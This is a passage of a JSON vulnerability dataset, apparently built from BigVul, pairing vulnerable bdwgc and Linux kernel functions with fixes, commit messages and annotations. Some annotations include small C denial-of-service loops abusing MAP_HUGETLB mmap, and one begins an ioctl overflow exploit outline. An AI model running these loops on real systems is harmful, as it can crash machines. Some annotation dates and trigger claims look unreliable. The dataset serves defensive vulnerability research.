        "solutions": " void * calloc(size_t n, size_t lb)\n {\n    if (lb && n > SIZE_MAX / lb)\n      return NULL;\n #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */\n         /* libpthread allocated some memory that is only pointed to by  */\n         /* mmapped thread stacks.  Make sure it's not collectable.      */\n        {\n          static GC_bool lib_bounds_set = FALSE;\n          ptr_t caller = (ptr_t)__builtin_return_address(0);\n          /* This test does not need to ensure memory visibility, since */\n          /* the bounds will be set when/if we create another thread.   */\n          if (!EXPECT(lib_bounds_set, TRUE)) {\n            GC_init_lib_bounds();\n            lib_bounds_set = TRUE;\n          }\n          if (((word)caller >= (word)GC_libpthread_start\n               && (word)caller < (word)GC_libpthread_end)\n              || ((word)caller >= (word)GC_libld_start\n                  && (word)caller < (word)GC_libld_end))\n            return GC_malloc_uncollectable(n*lb);\n          /* The two ranges are actually usually adjacent, so there may */\n          /* be a way to speed this up.                                 */\n        }\n#   endif\n    return((void *)REDIRECT_MALLOC(n*lb));\n}\n",
        "Publish Date": "2012-07-25",
        "Update Date": "2016-09-28",
        "Vulnerability type": "Overflow ",
        "commit_url": "https://github.com/ivmai/bdwgc/commit/e10c1eb9908c2774c16b3148b30d2f3823d66a9a",
        "commit_id": "e10c1eb9908c2774c16b3148b30d2f3823d66a9a",
        "commit_message": "Fix calloc() overflow\n\n* malloc.c (calloc): Check multiplication overflow in calloc(),\nassuming REDIRECT_MALLOC.",
        "project": "bdwgc"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2390",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "mm/hugetlb.c": "int hugetlb_reserve_pages(struct inode *inode,\n\t\t\t\t\tlong from, long to,\n\t\t\t\t\tstruct vm_area_struct *vma,\n\t\t\t\t\tvm_flags_t vm_flags)\n{\n\tlong ret, chg;\n\tstruct hstate *h = hstate_inode(inode);\n\tstruct hugepage_subpool *spool = subpool_inode(inode);\n\n\t/*\n\t * Only apply hugepage reservation if asked. At fault time, an\n\t * attempt will be made for VM_NORESERVE to allocate a page\n\t * without using reserves\n\t */\n\tif (vm_flags & VM_NORESERVE)\n\t\treturn 0;\n\n\t/*\n\t * Shared mappings base their reservation on the number of pages that\n\t * are already allocated on behalf of the file. Private mappings need\n\t * to reserve the full area even if read-only as mprotect() may be\n\t * called to make the mapping read-write. Assume !vma is a shm mapping\n\t */\n\tif (!vma || vma->vm_flags & VM_MAYSHARE)\n\t\tchg = region_chg(&inode->i_mapping->private_list, from, to);\n\telse {\n\t\tstruct resv_map *resv_map = resv_map_alloc();\n\t\tif (!resv_map)\n\t\t\treturn -ENOMEM;\n\n\t\tchg = to - from;\n\n\t\tset_vma_resv_map(vma, resv_map);\n \t\tset_vma_resv_flags(vma, HPAGE_RESV_OWNER);\n \t}\n \n\tif (chg < 0)\n\t\treturn chg;\n \n \t/* There must be enough pages in the subpool for the mapping */\n\tif (hugepage_subpool_get_pages(spool, chg))\n\t\treturn -ENOSPC;\n \n \t/*\n \t * Check enough hugepages are available for the reservation.\n\t * Hand the pages back to the subpool if there are not\n\t */\n \tret = hugetlb_acct_memory(h, chg);\n \tif (ret < 0) {\n \t\thugepage_subpool_put_pages(spool, chg);\n\t\treturn ret;\n \t}\n \n \t/*\n\t * Account for the reservations made. Shared mappings record regions\n\t * that have reservations as they are shared by multiple VMAs.\n\t * When the last VMA disappears, the region map says how much\n\t * the reservation was and the page cache tells how much of\n\t * the reservation was consumed. Private mappings are per-VMA and\n\t * only the consumed reservations are tracked. When the VMA\n\t * disappears, the original reservation is the VMA size and the\n\t * consumed reservations are stored in the map. Hence, nothing\n\t * else has to be done for private mappings here\n\t */\n \tif (!vma || vma->vm_flags & VM_MAYSHARE)\n \t\tregion_add(&inode->i_mapping->private_list, from, to);\n \treturn 0;\n }\n"
        },
        "vulnerabilities": "Memory leak in mm/hugetlb.c in the Linux kernel before 3.4.2 allows local users to cause a denial of service (memory consumption or system crash) via invalid MAP_HUGETLB mmap operations.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2390\n\n[Mandatory] Title: CVE-2012-2390 / CWE-399:\nMemory leak in Linux kernel hugetlb\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-06-13 \u2014 Patch release: 2012-11-06\n\n[Optional] Affected products/versions:\nLinux kernel before 3.4.2\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors\nMemory leak in mm/hugetlb.c in the Linux kernel before 3.4.2 allows local users to cause a denial of service (memory consumption or system crash) via invalid MAP_HUGETLB mmap operations.\n\n[Mandatory] Summary:\nThe vulnerability occurs in the hugetlb_reserve_pages function in mm/hugetlb.c. When called for anonymous (non-shared) mappings, it allocates a resv_map but fails to properly release it in error paths. This can be triggered by invalid MAP_HUGETLB mmap operations, leading to memory leaks.\n\n[Mandatory] Root cause:\nFailure to release resv_map allocations in error paths of hugetlb_reserve_pages function.\n\n[Mandatory] Attack Surface:\nLinux kernel memory management subsystem\n\n[Mandatory] Impact Summary:\nLocal denial of service (memory consumption or system crash)\n\n[Optional] Trigger / Attack vector:\nInvalid MAP_HUGETLB mmap operations\n\n[Mandatory] Key code/struct excerpt (minimal):\nif (!vma || vma->vm_flags & VM_MAYSHARE)\n    chg = region_chg(&inode->i_mapping->private_list, from, to);\nelse {\n    struct resv_map *resv_map = resv_map_alloc();\n    if (!resv_map)\n        return -ENOMEM;\n\n    chg = to - from;\n\n    set_vma_resv_map(vma, resv_map);\n    set_vma_resv_flags(vma, HPAGE_RESV_OWNER);\n}\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nMAP_HUGETLB mmap system call\n\n[Mandatory] Exploit primitive(s) available:\nMemory exhaustion\n\n[Mandatory] Exploitability summary (1 sentence):\nLocal users can repeatedly trigger the leak to exhaust system memory.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create invalid MAP_HUGETLB mmap operations\n- Repeatedly trigger the memory leak\n- Monitor system memory consumption\n- Crash system when memory exhausted\n\n[Mandatory] Exploitation Example script payload code:\n#include <sys/mman.h>\n#include <stdio.h>\n\nint main() {\n    while(1) {\n        void *addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE,\n                         MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB,\n                         -1, 0);\n        if(addr == MAP_FAILED) {\n            perror(\"mmap\");\n            continue;\n        }\n    }\n    return 0;\n}\n\nFix\n[Mandatory] Fix code:\nif (chg < 0) {\n    ret = chg;\n    goto out_err;\n}\n\n/* There must be enough pages in the subpool for the mapping */\nif (hugepage_subpool_get_pages(spool, chg)) {\n    ret = -ENOSPC;\n    goto out_err;\n}\n\n[...]\n\nout_err:\n    resv_map_put(vma);\n    return ret;\n\n[Mandatory] Fix summary:\nAdded proper cleanup of resv_map allocations in error paths via goto out_err and resv_map_put.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/c50ac050811d6485616a193eb0f37bfbd191cc89\n\n[Optional] Patch Analysis:\nAdded error handling paths to properly release resources. Field: PatchType: resource cleanup added\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other resource management in hugetlb code\n- Check for similar leaks in other memory management subsystems\n\n[Optional] Likely variants/impact (one line):\nOther resource leaks in memory management error paths",
        "tests": "NA",
        "solutions": "int hugetlb_reserve_pages(struct inode *inode,\n\t\t\t\t\tlong from, long to,\n\t\t\t\t\tstruct vm_area_struct *vma,\n\t\t\t\t\tvm_flags_t vm_flags)\n{\n\tlong ret, chg;\n\tstruct hstate *h = hstate_inode(inode);\n\tstruct hugepage_subpool *spool = subpool_inode(inode);\n\n\t/*\n\t * Only apply hugepage reservation if asked. At fault time, an\n\t * attempt will be made for VM_NORESERVE to allocate a page\n\t * without using reserves\n\t */\n\tif (vm_flags & VM_NORESERVE)\n\t\treturn 0;\n\n\t/*\n\t * Shared mappings base their reservation on the number of pages that\n\t * are already allocated on behalf of the file. Private mappings need\n\t * to reserve the full area even if read-only as mprotect() may be\n\t * called to make the mapping read-write. Assume !vma is a shm mapping\n\t */\n\tif (!vma || vma->vm_flags & VM_MAYSHARE)\n\t\tchg = region_chg(&inode->i_mapping->private_list, from, to);\n\telse {\n\t\tstruct resv_map *resv_map = resv_map_alloc();\n\t\tif (!resv_map)\n\t\t\treturn -ENOMEM;\n\n\t\tchg = to - from;\n\n\t\tset_vma_resv_map(vma, resv_map);\n \t\tset_vma_resv_flags(vma, HPAGE_RESV_OWNER);\n \t}\n \n\tif (chg < 0) {\n\t\tret = chg;\n\t\tgoto out_err;\n\t}\n \n \t/* There must be enough pages in the subpool for the mapping */\n\tif (hugepage_subpool_get_pages(spool, chg)) {\n\t\tret = -ENOSPC;\n\t\tgoto out_err;\n\t}\n \n \t/*\n \t * Check enough hugepages are available for the reservation.\n\t * Hand the pages back to the subpool if there are not\n\t */\n \tret = hugetlb_acct_memory(h, chg);\n \tif (ret < 0) {\n \t\thugepage_subpool_put_pages(spool, chg);\n\t\tgoto out_err;\n \t}\n \n \t/*\n\t * Account for the reservations made. Shared mappings record regions\n\t * that have reservations as they are shared by multiple VMAs.\n\t * When the last VMA disappears, the region map says how much\n\t * the reservation was and the page cache tells how much of\n\t * the reservation was consumed. Private mappings are per-VMA and\n\t * only the consumed reservations are tracked. When the VMA\n\t * disappears, the original reservation is the VMA size and the\n\t * consumed reservations are stored in the map. Hence, nothing\n\t * else has to be done for private mappings here\n\t */\n \tif (!vma || vma->vm_flags & VM_MAYSHARE)\n \t\tregion_add(&inode->i_mapping->private_list, from, to);\n \treturn 0;\nout_err:\n\tresv_map_put(vma);\n\treturn ret;\n }\n",
        "Publish Date": "2012-06-13",
        "Update Date": "2012-11-06",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/c50ac050811d6485616a193eb0f37bfbd191cc89",
        "commit_id": "c50ac050811d6485616a193eb0f37bfbd191cc89",
        "commit_message": "hugetlb: fix resv_map leak in error path\n\nWhen called for anonymous (non-shared) mappings, hugetlb_reserve_pages()\ndoes a resv_map_alloc().  It depends on code in hugetlbfs's\nvm_ops->close() to release that allocation.\n\nHowever, in the mmap() failure path, we do a plain unmap_region() without\nthe remove_vma() which actually calls vm_ops->close().\n\nThis is a decent fix.  This leak could get reintroduced if new code (say,\nafter hugetlb_reserve_pages() in hugetlbfs_file_mmap()) decides to return\nan error.  But, I think it would have to unroll the reservation anyway.\n\nChristoph's test case:\n\n\thttp://marc.info/?l=linux-mm&m=133728900729735\n\nThis patch applies to 3.4 and later.  A version for earlier kernels is at\nhttps://lkml.org/lkml/2012/5/22/418.\n\nSigned-off-by: Dave Hansen <dave@linux.vnet.ibm.com>\nAcked-by: Mel Gorman <mel@csn.ul.ie>\nAcked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>\nReported-by: Christoph Lameter <cl@linux.com>\nTested-by: Christoph Lameter <cl@linux.com>\nCc: Andrea Arcangeli <aarcange@redhat.com>\nCc: <stable@vger.kernel.org>\t[2.6.32+]\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2390",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "mm/hugetlb.c": " static void hugetlb_vm_op_close(struct vm_area_struct *vma)\n {\n \tstruct hstate *h = hstate_vma(vma);\n\tstruct resv_map *reservations = vma_resv_map(vma);\n\tstruct hugepage_subpool *spool = subpool_vma(vma);\n\tunsigned long reserve;\n\tunsigned long start;\n\tunsigned long end;\n\n\tif (reservations) {\n\t\tstart = vma_hugecache_offset(h, vma, vma->vm_start);\n\t\tend = vma_hugecache_offset(h, vma, vma->vm_end);\n\n \t\treserve = (end - start) -\n \t\t\tregion_count(&reservations->regions, start, end);\n \n\t\tkref_put(&reservations->refs, resv_map_release);\n \n \t\tif (reserve) {\n \t\t\thugetlb_acct_memory(h, -reserve);\n\t\t\thugepage_subpool_put_pages(spool, reserve);\n\t\t}\n\t}\n}\n"
        },
        "vulnerabilities": "Memory leak in mm/hugetlb.c in the Linux kernel before 3.4.2 allows local users to cause a denial of service (memory consumption or system crash) via invalid MAP_HUGETLB mmap operations.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2390\n\n[Mandatory] Title: CVE-2012-2390 / CWE-399:\nMemory leak in Linux kernel hugetlb handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-06-13 \u2014 Patch release: 2012-11-06\n\n[Optional] Affected products/versions:\nLinux kernel before 3.4.2\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors\n\n[Mandatory] Summary:\nThe vulnerability is a memory leak in the hugetlb_vm_op_close() function in mm/hugetlb.c in the Linux kernel. It occurs when handling invalid MAP_HUGETLB mmap operations, allowing local users to cause a denial of service (memory consumption or system crash) by triggering repeated memory leaks. The code fails to properly release reservation map resources in certain error paths.\n\n[Mandatory] Root cause:\nThe function hugetlb_vm_op_close() improperly used kref_put() for reservation map cleanup instead of resv_map_put(), leading to resource leaks.\n\n[Mandatory] Attack Surface:\nLinux kernel memory management subsystem (hugetlb handling)\n\n[Mandatory] Impact Summary:\nLocal denial of service via memory exhaustion\n\n[Optional] Trigger / Attack vector:\nInvalid MAP_HUGETLB mmap operations\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nstatic void hugetlb_vm_op_close(struct vm_area_struct *vma)\n{\n\tif (reservations) {\n\t\t[...]\n\t\tkref_put(&reservations->refs, resv_map_release);\n\t\t[...]\n\t}\n}\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nKernel memory management operations (hugetlb mmap)\n\n[Mandatory] Exploit primitive(s) available:\nMemory exhaustion via resource leak\n\n[Mandatory] Exploitability summary (1 sentence):\nLocal attackers can repeatedly trigger the leak to exhaust system memory.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create multiple invalid MAP_HUGETLB mappings\n- Cause allocation but prevent proper cleanup\n- Repeat to exhaust available memory\n- Can be triggered by unprivileged users\n- Results in system instability or crash\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <sys/mman.h>\n\nint main() {\n    while(1) {\n        // Create invalid hugepage mapping to trigger leak\n        void *addr = mmap(NULL, 1024*1024, PROT_READ,\n                         MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB, -1, 0);\n        if(addr == MAP_FAILED) continue;\n        // Don't properly clean up to leave leaked resources\n    }\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nstatic void hugetlb_vm_op_close(struct vm_area_struct *vma)\n{\n\tif (reservations) {\n\t\t[...]\n\t\tresv_map_put(vma);\n\t\t[...]\n\t}\n}\n```\n\n[Mandatory] Fix summary:\nReplaced kref_put() with resv_map_put() to properly clean up reservation map resources and prevent memory leaks.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/c50ac050811d6485616a193eb0f37bfbd191cc89\n\n[Optional] Patch Analysis:\nField: PatchType - Resource cleanup correction\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Check for similar resource management issues in other VM operations\n- Review error paths in memory mapping related functions\n\n[Optional] Likely variants/impact (one line):\nOther VM operations might have similar resource cleanup issues",
        "tests": "NA",
        "solutions": " static void hugetlb_vm_op_close(struct vm_area_struct *vma)\n {\n \tstruct hstate *h = hstate_vma(vma);\n\tstruct resv_map *reservations = vma_resv_map(vma);\n\tstruct hugepage_subpool *spool = subpool_vma(vma);\n\tunsigned long reserve;\n\tunsigned long start;\n\tunsigned long end;\n\n\tif (reservations) {\n\t\tstart = vma_hugecache_offset(h, vma, vma->vm_start);\n\t\tend = vma_hugecache_offset(h, vma, vma->vm_end);\n\n \t\treserve = (end - start) -\n \t\t\tregion_count(&reservations->regions, start, end);\n \n\t\tresv_map_put(vma);\n \n \t\tif (reserve) {\n \t\t\thugetlb_acct_memory(h, -reserve);\n\t\t\thugepage_subpool_put_pages(spool, reserve);\n\t\t}\n\t}\n}\n",
        "Publish Date": "2012-06-13",
        "Update Date": "2012-11-06",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/c50ac050811d6485616a193eb0f37bfbd191cc89",
        "commit_id": "c50ac050811d6485616a193eb0f37bfbd191cc89",
        "commit_message": "hugetlb: fix resv_map leak in error path\n\nWhen called for anonymous (non-shared) mappings, hugetlb_reserve_pages()\ndoes a resv_map_alloc().  It depends on code in hugetlbfs's\nvm_ops->close() to release that allocation.\n\nHowever, in the mmap() failure path, we do a plain unmap_region() without\nthe remove_vma() which actually calls vm_ops->close().\n\nThis is a decent fix.  This leak could get reintroduced if new code (say,\nafter hugetlb_reserve_pages() in hugetlbfs_file_mmap()) decides to return\nan error.  But, I think it would have to unroll the reservation anyway.\n\nChristoph's test case:\n\n\thttp://marc.info/?l=linux-mm&m=133728900729735\n\nThis patch applies to 3.4 and later.  A version for earlier kernels is at\nhttps://lkml.org/lkml/2012/5/22/418.\n\nSigned-off-by: Dave Hansen <dave@linux.vnet.ibm.com>\nAcked-by: Mel Gorman <mel@csn.ul.ie>\nAcked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>\nReported-by: Christoph Lameter <cl@linux.com>\nTested-by: Christoph Lameter <cl@linux.com>\nCc: Andrea Arcangeli <aarcange@redhat.com>\nCc: <stable@vger.kernel.org>\t[2.6.32+]\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-189",
        "CVE": "CVE-2012-2384",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "drivers/gpu/drm/i915/i915_gem_execbuffer.c": "i915_gem_do_execbuffer(struct drm_device *dev, void *data,\n\t\t       struct drm_file *file,\n\t\t       struct drm_i915_gem_execbuffer2 *args,\n\t\t       struct drm_i915_gem_exec_object2 *exec)\n{\n\tdrm_i915_private_t *dev_priv = dev->dev_private;\n\tstruct list_head objects;\n\tstruct eb_objects *eb;\n\tstruct drm_i915_gem_object *batch_obj;\n\tstruct drm_clip_rect *cliprects = NULL;\n\tstruct intel_ring_buffer *ring;\n\tu32 exec_start, exec_len;\n\tu32 seqno;\n\tu32 mask;\n\tint ret, mode, i;\n\n\tif (!i915_gem_check_execbuffer(args)) {\n\t\tDRM_DEBUG(\"execbuf with invalid offset/length\\n\");\n\t\treturn -EINVAL;\n\t}\n\n\tret = validate_exec_list(exec, args->buffer_count);\n\tif (ret)\n\t\treturn ret;\n\n\tswitch (args->flags & I915_EXEC_RING_MASK) {\n\tcase I915_EXEC_DEFAULT:\n\tcase I915_EXEC_RENDER:\n\t\tring = &dev_priv->ring[RCS];\n\t\tbreak;\n\tcase I915_EXEC_BSD:\n\t\tif (!HAS_BSD(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BSD)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[VCS];\n\t\tbreak;\n\tcase I915_EXEC_BLT:\n\t\tif (!HAS_BLT(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BLT)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[BCS];\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown ring: %d\\n\",\n\t\t\t  (int)(args->flags & I915_EXEC_RING_MASK));\n\t\treturn -EINVAL;\n\t}\n\n\tmode = args->flags & I915_EXEC_CONSTANTS_MASK;\n\tmask = I915_EXEC_CONSTANTS_MASK;\n\tswitch (mode) {\n\tcase I915_EXEC_CONSTANTS_REL_GENERAL:\n\tcase I915_EXEC_CONSTANTS_ABSOLUTE:\n\tcase I915_EXEC_CONSTANTS_REL_SURFACE:\n\t\tif (ring == &dev_priv->ring[RCS] &&\n\t\t    mode != dev_priv->relative_constants_mode) {\n\t\t\tif (INTEL_INFO(dev)->gen < 4)\n\t\t\t\treturn -EINVAL;\n\n\t\t\tif (INTEL_INFO(dev)->gen > 5 &&\n\t\t\t    mode == I915_EXEC_CONSTANTS_REL_SURFACE)\n\t\t\t\treturn -EINVAL;\n\n\t\t\t/* The HW changed the meaning on this bit on gen6 */\n\t\t\tif (INTEL_INFO(dev)->gen >= 6)\n\t\t\t\tmask &= ~I915_EXEC_CONSTANTS_REL_SURFACE;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown constants: %d\\n\", mode);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->buffer_count < 1) {\n\t\tDRM_DEBUG(\"execbuf with %d buffers\\n\", args->buffer_count);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->num_cliprects != 0) {\n\t\tif (ring != &dev_priv->ring[RCS]) {\n\t\t\tDRM_DEBUG(\"clip rectangles are only valid with the render ring\\n\");\n \t\t\treturn -EINVAL;\n \t\t}\n \n \t\tcliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n \t\t\t\t    GFP_KERNEL);\n \t\tif (cliprects == NULL) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\n\t\tif (copy_from_user(cliprects,\n\t\t\t\t     (struct drm_clip_rect __user *)(uintptr_t)\n\t\t\t\t     args->cliprects_ptr,\n\t\t\t\t     sizeof(*cliprects)*args->num_cliprects)) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\t}\n\n\tret = i915_mutex_lock_interruptible(dev);\n\tif (ret)\n\t\tgoto pre_mutex_err;\n\n\tif (dev_priv->mm.suspended) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -EBUSY;\n\t\tgoto pre_mutex_err;\n\t}\n\n\teb = eb_create(args->buffer_count);\n\tif (eb == NULL) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -ENOMEM;\n\t\tgoto pre_mutex_err;\n\t}\n\n\t/* Look up object handles */\n\tINIT_LIST_HEAD(&objects);\n\tfor (i = 0; i < args->buffer_count; i++) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = to_intel_bo(drm_gem_object_lookup(dev, file,\n\t\t\t\t\t\t\texec[i].handle));\n\t\tif (&obj->base == NULL) {\n\t\t\tDRM_DEBUG(\"Invalid object handle %d at index %d\\n\",\n\t\t\t\t   exec[i].handle, i);\n\t\t\t/* prevent error path from reading uninitialized data */\n\t\t\tret = -ENOENT;\n\t\t\tgoto err;\n\t\t}\n\n\t\tif (!list_empty(&obj->exec_list)) {\n\t\t\tDRM_DEBUG(\"Object %p [handle %d, index %d] appears more than once in object list\\n\",\n\t\t\t\t   obj, exec[i].handle, i);\n\t\t\tret = -EINVAL;\n\t\t\tgoto err;\n\t\t}\n\n\t\tlist_add_tail(&obj->exec_list, &objects);\n\t\tobj->exec_handle = exec[i].handle;\n\t\tobj->exec_entry = &exec[i];\n\t\teb_add_object(eb, obj);\n\t}\n\n\t/* take note of the batch buffer before we might reorder the lists */\n\tbatch_obj = list_entry(objects.prev,\n\t\t\t       struct drm_i915_gem_object,\n\t\t\t       exec_list);\n\n\t/* Move the objects en-masse into the GTT, evicting if necessary. */\n\tret = i915_gem_execbuffer_reserve(ring, file, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\t/* The objects are in their final locations, apply the relocations. */\n\tret = i915_gem_execbuffer_relocate(dev, eb, &objects);\n\tif (ret) {\n\t\tif (ret == -EFAULT) {\n\t\t\tret = i915_gem_execbuffer_relocate_slow(dev, file, ring,\n\t\t\t\t\t\t\t\t&objects, eb,\n\t\t\t\t\t\t\t\texec,\n\t\t\t\t\t\t\t\targs->buffer_count);\n\t\t\tBUG_ON(!mutex_is_locked(&dev->struct_mutex));\n\t\t}\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\t/* Set the pending read domains for the batch buffer to COMMAND */\n\tif (batch_obj->base.pending_write_domain) {\n\t\tDRM_DEBUG(\"Attempting to use self-modifying batch buffer\\n\");\n\t\tret = -EINVAL;\n\t\tgoto err;\n\t}\n\tbatch_obj->base.pending_read_domains |= I915_GEM_DOMAIN_COMMAND;\n\n\tret = i915_gem_execbuffer_move_to_gpu(ring, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\tseqno = i915_gem_next_request_seqno(ring);\n\tfor (i = 0; i < ARRAY_SIZE(ring->sync_seqno); i++) {\n\t\tif (seqno < ring->sync_seqno[i]) {\n\t\t\t/* The GPU can not handle its semaphore value wrapping,\n\t\t\t * so every billion or so execbuffers, we need to stall\n\t\t\t * the GPU in order to reset the counters.\n\t\t\t */\n\t\t\tret = i915_gpu_idle(dev, true);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tBUG_ON(ring->sync_seqno[i]);\n\t\t}\n\t}\n\n\tif (ring == &dev_priv->ring[RCS] &&\n\t    mode != dev_priv->relative_constants_mode) {\n\t\tret = intel_ring_begin(ring, 4);\n\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\tintel_ring_emit(ring, MI_NOOP);\n\t\tintel_ring_emit(ring, MI_LOAD_REGISTER_IMM(1));\n\t\tintel_ring_emit(ring, INSTPM);\n\t\tintel_ring_emit(ring, mask << 16 | mode);\n\t\tintel_ring_advance(ring);\n\n\t\tdev_priv->relative_constants_mode = mode;\n\t}\n\n\tif (args->flags & I915_EXEC_GEN7_SOL_RESET) {\n\t\tret = i915_reset_gen7_sol_offsets(dev, ring);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ttrace_i915_gem_ring_dispatch(ring, seqno);\n\n\texec_start = batch_obj->gtt_offset + args->batch_start_offset;\n\texec_len = args->batch_len;\n\tif (cliprects) {\n\t\tfor (i = 0; i < args->num_cliprects; i++) {\n\t\t\tret = i915_emit_box(dev, &cliprects[i],\n\t\t\t\t\t    args->DR1, args->DR4);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tret = ring->dispatch_execbuffer(ring,\n\t\t\t\t\t\t\texec_start, exec_len);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\t\t}\n\t} else {\n\t\tret = ring->dispatch_execbuffer(ring, exec_start, exec_len);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ti915_gem_execbuffer_move_to_active(&objects, ring, seqno);\n\ti915_gem_execbuffer_retire_commands(dev, file, ring);\n\nerr:\n\teb_destroy(eb);\n\twhile (!list_empty(&objects)) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = list_first_entry(&objects,\n\t\t\t\t       struct drm_i915_gem_object,\n\t\t\t\t       exec_list);\n\t\tlist_del_init(&obj->exec_list);\n\t\tdrm_gem_object_unreference(&obj->base);\n\t}\n\n\tmutex_unlock(&dev->struct_mutex);\n\npre_mutex_err:\n\tkfree(cliprects);\n\treturn ret;\n}\n"
        },
        "vulnerabilities": "Integer overflow in the i915_gem_do_execbuffer function in drivers/gpu/drm/i915/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2384\n\n[Mandatory] Title: CVE-2012-2384 / CWE-189:\nInteger overflow in i915_gem_do_execbuffer\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-06-13 \u2014 Patch release: 2016-08-22\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.5 on 32-bit platforms\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-189: Numeric Errors \u2192 Integer overflow to buffer overflow\n[Mandatory] Summary:\nThe vulnerability occurs in the i915_gem_do_execbuffer function in the Linux kernel's DRM subsystem. A local user can trigger an integer overflow via a crafted ioctl call with a large args->num_cliprects value on 32-bit systems, leading to an out-of-bounds write during cliprects buffer allocation.\n[Mandatory] Root cause:\nUnchecked multiplication of args->num_cliprects with sizeof(*cliprects) allows integer overflow in buffer size calculation.\n[Mandatory] Attack Surface:\nLocal userspace \u2192 kernel via DRM ioctl interface\n[Mandatory] Impact Summary:\nKernel memory corruption \u2192 potential privilege escalation or DoS\n[Optional] Trigger / Attack vector:\nCrafted DRM_IOCTL_I915_GEM_EXECBUFFER2 ioctl call\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nif (args->num_cliprects != 0) {\n    cliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n                        GFP_KERNEL);\n    if (copy_from_user(cliprects,\n                     (struct drm_clip_rect __user *)(uintptr_t)\n                     args->cliprects_ptr,\n                     sizeof(*cliprects)*args->num_cliprects)) {\n        ret = -EFAULT;\n        goto pre_mutex_err;\n    }\n}\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nDRM_IOCTL_I915_GEM_EXECBUFFER2 ioctl\n\n[Mandatory] Exploit primitive(s) available:\nControlled heap overflow\n\n[Mandatory] Exploitability summary (1 sentence):\nLocal attackers can trigger the overflow with a specially crafted ioctl call on 32-bit systems to corrupt kernel memory.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Open /dev/dri/card0 device\n- Prepare execbuffer arguments with large num_cliprects 